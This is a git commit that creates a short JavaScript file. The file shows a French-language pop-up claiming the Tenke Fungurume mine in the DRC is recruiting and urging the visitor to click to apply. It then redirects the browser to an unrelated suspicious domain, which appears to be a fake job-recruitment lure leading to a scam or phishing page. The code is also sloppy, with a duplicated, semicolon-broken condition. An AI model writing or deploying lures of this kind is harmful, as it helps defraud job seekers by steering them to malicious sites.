2bcbc32500b7f3bed4b5d5fd58fcff3c2d26e539
newetijazz10 <newetijazz10@gmail.com>
2026-01-07 11:46:36 +0100

    Create drcjob.js

---
+++ drcjob.js
@@ -0,0 +1,6 @@
+var password = 'Recrutement à la mine Tenke Fungurume'
+password=prompt('AVIS :  La mine de Tenke Fungurume recrute actuellement. Appuyez sur OK pour postuler. ','Recrutement à la mine Tenke Fungurume');
+if (password != 'Recrutement à la mine Tenke Fungurume');
+if (password != 'Recrutement à la mine Tenke Fungurume') {
+location.href='https://www.favmrzi.online/TFM-drc-recrute';
+}
